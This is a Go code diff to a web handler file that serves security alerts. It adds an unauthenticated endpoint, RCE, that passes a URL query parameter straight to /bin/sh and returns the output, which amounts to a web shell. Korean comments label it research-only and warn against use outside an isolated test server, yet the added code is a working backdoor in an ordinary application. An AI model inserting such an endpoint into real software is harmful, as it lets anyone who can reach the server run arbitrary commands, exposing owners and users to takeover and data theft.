@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"encoding/xml"
 	"net/http"
+	"os/exec"
 	"example.com/collector"
 	"example.com/db"
 )
@@ -122,6 +123,30 @@ func GetCrowdsecAlerts(w http.ResponseWriter, r *http.Request) {
 	entries := collector.FetchAlertList(200)
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(entries)
+}
+
+// [연구 전용] GET 기반 RCE 엔드포인트 — /RCE/?command=ls -al
+//
+// 경고: command 쿼리 파라미터를 셸에 그대로 전달해 임의 명령을 실행한다.
+// 인증이 전혀 없으므로 접근 가능한 누구나 서버에서 명령을 실행할 수 있다.
+// 반드시 민감정보 없는 격리된 테스트 서버에서만 사용할 것.
+func RCE(w http.ResponseWriter, r *http.Request) {
+	//command 파라미터 추출
+	command := r.URL.Query().Get("command")
+	if command == "" {
+		http.Error(w, "command 파라미터가 필요합니다 (예: /RCE/?command=ls -al)", http.StatusBadRequest)
+		return
+	}
+
+	//셸을 통해 실행 (파이프/리다이렉트 등 셸 문법 지원). 표준출력+표준에러 모두 수집
+	out, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
+
+	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+	//실행 에러(0이 아닌 종료코드 등)여도 출력은 함께 반환
+	w.Write(out)
+	if err != nil {
+		w.Write([]byte("\n[error] " + err.Error()))
+	}
 }
 
 //새로고침 로직 : collect.Collect 즉시 실행
